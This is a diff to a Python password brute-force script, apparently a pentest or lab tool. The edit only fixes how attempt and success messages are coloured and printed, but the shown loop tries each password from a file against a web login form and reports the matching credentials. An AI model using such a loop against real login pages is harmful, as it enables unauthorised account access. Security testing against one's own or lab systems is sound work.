@@ -12,17 +12,17 @@ def cracking(username, url):
     with open(password_file, "r") as passwords:
         for password in passwords:
             password = password.strip()
-            print(
-                colored(
-                    f"[+] Attempting to bruteforce {username} with password: {password}"
-                ),
-                "red",
+            attempt_message = (
+                f"[+] Attempting to bruteforce {username} with password: {password}"
             )
+            print(colored(attempt_message, "red"))
+
             data = {
                 "username": username,
                 "password": password,
                 "Login": "submit",
             }
+
             if cookie_value != "":
                 response = requests.get(
                     url,
@@ -39,8 +39,10 @@ def cracking(username, url):
             if login_failed_string in response.content.decode():
                 pass
             else:
-                print(colored(f"[+] username found: {username}"), "green")
-                print(colored(f"[+] password found: {password}"), "green")
+                success_username = colored(f"[+] username found: {username}", "green")
+                success_password = colored(f"[+] password found: {password}", "green")
+                print(success_username)
+                print(success_password)
                 exit()
 
 
